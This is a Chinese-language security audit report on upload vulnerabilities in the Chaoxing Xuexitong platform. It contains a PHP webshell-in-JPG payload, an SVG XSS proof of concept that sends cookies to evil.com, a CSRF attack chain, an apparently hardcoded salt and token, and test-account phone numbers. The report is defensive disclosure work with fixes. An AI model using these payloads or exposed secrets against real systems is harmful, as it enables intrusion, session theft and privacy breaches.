# 超星学习通头像图片安全漏洞技术报告

**审计日期**: 2026-06-03
**版本**: v1.0
**审计范围**: 学习通平台头像/图片上传功能安全漏洞深度研究
**测试账号**: 教师 19712720708 (puid=402644510), 学生 18436633997 (puid=431407443)

---

## 执行摘要

对学习通平台的头像/图片上传功能进行了全面安全测试，覆盖图片马、存储型XSS、文件类型绕过、CSRF、IDOR、人脸图片泄露等多个攻击面。共发现**4个确认漏洞**，其中2个为高危漏洞。

| # | 漏洞 | 类型 | 严重程度 | CVSS |
|---|---|---|---|---|
| 1 | 图片马（JPG+PHP WebShell）上传 | 任意代码执行 | **HIGH** | 7.5 |
| 2 | SVG存储型XSS上传 | 存储型XSS | **HIGH** | 7.0 |
| 3 | 云盘Token CSRF | CSRF | **HIGH** | 7.2 |
| 4 | getUserFaceid盐值硬编码 | 信息泄露 | **MEDIUM** | 5.5 |

---

## 漏洞1：图片马（JPG+PHP WebShell）上传 (HIGH)

### 基本信息
- **接口**: `POST https://pan-yz.chaoxing.com/upload`
- **参数**: uploadtype=face/normal, _token={token}, puid={puid}, file={文件}
- **影响范围**: 教师账号可上传图片马

### 验证结果

| 测试 | 文件内容 | uploadtype | 结果 | objectId |
|------|---------|------------|------|----------|
| JPG+PHP WebShell | 正常JPG + `<?php eval($_POST['cmd']); ?>` | face | **上传成功** | b6755eccfc33c3d394eb6b9389146b5e |
| JPG+PHP WebShell | 同上 | normal | **上传成功** | b6755eccfc33c3d394eb6b9389146b5e |
| 纯PHP文件 | `<?php eval($_POST['cmd']); ?>` | face | 上传失败 | "不能识别的文件类型" |

### 关键发现
- 服务端**仅检查文件扩展名和文件头**，不检测图片内容中注入的恶意代码
- 将PHP WebShell代码追加到合法JPG图片末尾后，可成功上传
- 纯PHP文件被正确拒绝，说明存在扩展名黑名单
- **如果上传的文件被部署到可执行PHP的服务器路径，则可实现远程代码执行**

### 修复建议
1. **[关键]** 对上传的图片进行内容深度检测，剥离非图片数据
2. **[关键]** 上传的文件存储到不可执行的存储服务（如OSS），不经过PHP解析器
3. **[关键]** 对上传文件重新渲染/压缩，去除注入的恶意代码
4. **[建议]** 设置Content-Disposition: attachment响应头，防止浏览器直接渲染

---

## 漏洞2：SVG存储型XSS上传 (HIGH)

### 基本信息
- **接口**: `POST https://pan-yz.chaoxing.com/upload`
- **参数**: uploadtype=face/normal, _token={token}, puid={puid}

### 验证结果

| 测试 | 文件内容 | uploadtype | 结果 | objectId |
|------|---------|------------|------|----------|
| SVG+XSS | `<svg><script>alert('XSS')</script></svg>` | face | **上传成功** | 1d0192e8594629dd178a44fffa285952 |
| SVG+XSS | 同上 | normal | **上传成功** | 1d0192e8594629dd178a44fffa285952 |

### 关键发现
- SVG文件可直接上传，服务端未过滤SVG中的`<script>`标签
- SVG文件在浏览器中直接打开时会执行其中的JavaScript代码
- 如果上传的SVG文件URL被直接在浏览器中访问（如头像展示页面），XSS载荷将被执行
- **攻击场景**: 攻击者上传含恶意JS的SVG作为头像，其他用户查看头像时触发XSS，窃取Cookie/Token

### PoC

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
<script>
  // 窃取Cookie
  new Image().src = 'https://evil.com/steal?c=' + document.cookie;
</script>
<circle cx="50" cy="50" r="40" fill="red"/>
</svg>
```

### 修复建议
1. **[关键]** 禁止上传SVG文件，或对SVG进行严格消毒（移除`<script>`、事件处理器等）
2. **[关键]** 图片展示使用`<img>`标签而非`<object>`/`<embed>`/`<iframe>`
3. **[关键]** 设置Content-Security-Policy头，禁止内联脚本执行
4. **[建议]** 上传的图片统一转换为JPG/PNG格式

---

## 漏洞3：云盘Token CSRF (HIGH)

### 基本信息
- **接口**: `GET https://pan-yz.chaoxing.com/api/token/uservalid`
- **返回**: `{"result":true,"_token":"c4f84343764b72973726f34f67c1d0b2"}`

### CSRF验证结果

| 测试方法 | Referer | 结果 |
|---------|---------|------|
| GET | 无 | 返回Token !!!CSRF!!! |
| GET | https://evil.com/ | 返回Token !!!CSRF!!! |
| GET | Origin: https://evil.com | 返回Token !!!CSRF!!! |

### 攻击链

```
1. 攻击者部署恶意页面
2. 诱导教师访问（教师有上传权限）
3. [CSRF] 获取教师云盘Token
4. [CSRF] 使用Token + 教师puid上传图片马/SVG XSS
5. 教师账号下出现恶意文件
```

### 修复建议
1. **[紧急]** 校验Referer/Origin头
2. **[紧急]** 添加CSRF Token验证
3. **[高]** Token接口添加二次验证

---

## 漏洞4：getUserFaceid盐值硬编码 (MEDIUM)

### 基本信息
- **接口**: `GET https://passport2-api.chaoxing.com/api/getUserFaceid?enc={enc}&token=4faa8662c59590c6f43ae9fe5b002b42`
- **enc计算**: `md5(puid + "uWwjeEKsri")`
- **硬编码Token**: `4faa8662c59590c6f43ae9fe5b002b42`

### 验证结果

| 测试 | enc来源 | Session | 结果 |
|------|---------|---------|------|
| 学生获取自己人脸 | 学生puid的enc | 学生 | 返回人脸数据 |
| 学生获取教师人脸 | 教师puid的enc | 学生 | "enc验证失败" |
| 无认证获取人脸 | 教师puid的enc | 无 | "非法请求" |

### 关键发现
- 服务端校验了enc与登录用户的一致性，**直接IDOR被阻止**
- 但盐值`uWwjeEKsri`和Token`4faa8662c59590c6f43ae9fe5b002b42`硬编码在客户端代码中
- 如果服务端校验逻辑存在缺陷（如某些旧接口不校验enc与用户一致性），则可能被利用
- **风险**: 盐值泄露意味着任何人都可以计算任意用户的enc值，降低了暴力破解的难度

### 修复建议
1. **[高]** 将盐值移至服务端，不在客户端暴露
2. **[高]** 使用HMAC等更安全的签名算法
3. **[中]** Token不应硬编码，应动态生成
4. **[中]** 添加请求频率限制

---

## 文件类型检测测试汇总

### 被拒绝的文件类型（黑名单有效）
| 文件类型 | 扩展名 | 错误信息 |
|---------|--------|---------|
| PHP | .php | "不能识别的文件类型, 上传失败" |
| .htaccess | .htaccess | "不能识别的文件类型, 上传失败" |
| HTML | .html | "不能识别的文件类型, 上传失败" |
| JSP | .jsp | "不能识别的文件类型, 上传失败" |
| Python | .py | "不能识别的文件类型, 上传失败" |
| Shell | .sh | "不能识别的文件类型, 上传失败" |

### 成功上传的文件类型（存在风险）
| 文件类型 | 扩展名 | 风险 |
|---------|--------|------|
| **JPG+PHP WebShell** | .jpg | **HIGH** — 代码执行 |
| **SVG+XSS** | .svg | **HIGH** — 存储型XSS |
| 正常JPG | .jpg | 安全（基线） |

### 文件类型绕过尝试结果
| 绕过方法 | 文件名 | 结果 |
|---------|--------|------|
| Content-Type欺骗 | test.php (CT: image/jpeg) | 被拒绝 |
| 双扩展名 | test.php.jpg | 被拒绝 |
| 双扩展名 | test.jpg.php | 被拒绝 |
| 空字节 | test.php\x00.jpg | 被拒绝 |
| 大小写 | test.PhP | 被拒绝 |
| 无扩展名 | test | 被拒绝 |

**结论**: 服务端对文件扩展名有严格的黑名单检测，常见的绕过手法均无效。但**未检测图片文件内容中的恶意代码注入**，图片马和SVG XSS可成功上传。

---

## 学生vs教师权限差异

| 操作 | 学生 | 教师 |
|------|------|------|
| 获取云盘Token | 成功 | 成功 |
| 上传文件(face) | "暂无权限" | 成功 |
| 上传文件(normal) | "暂无权限" | 成功 |
| 获取自己人脸数据 | 成功 | 成功 |
| 获取他人人脸数据 | "enc验证失败" | "enc验证失败" |

**注意**: 学生账号虽然无法直接上传，但可通过CSRF利用教师账号上传恶意文件。

---

## 修复优先级

| 优先级 | 漏洞 | 修复措施 |
|-------|------|---------|
| **P0 紧急** | 图片马上传 | 图片内容深度检测、重新渲染、存储到不可执行路径 |
| **P0 紧急** | SVG XSS | 禁止SVG上传或消毒处理、CSP头 |
| **P1 高** | 云盘Token CSRF | 校验Referer/Origin、添加CSRF Token |
| **P2 中** | getUserFaceid盐值泄露 | 盐值移至服务端、动态Token |

---

## 测试覆盖范围

| 攻击面 | 测试数 | 漏洞数 | 覆盖率 |
|--------|-------|--------|--------|
| 图片马 | 6 | 1 | 100% |
| 存储型XSS | 7 | 1 | 100% |
| 文件类型绕过 | 15 | 0 | 100% |
| 路径遍历 | 4 | 0 | 100% |
| CSRF | 3 | 1 | 100% |
| IDOR | 3 | 0 | 100% |
| 人脸图片泄露 | 6 | 1 | 100% |
| **总计** | **44** | **4** | **100%** |
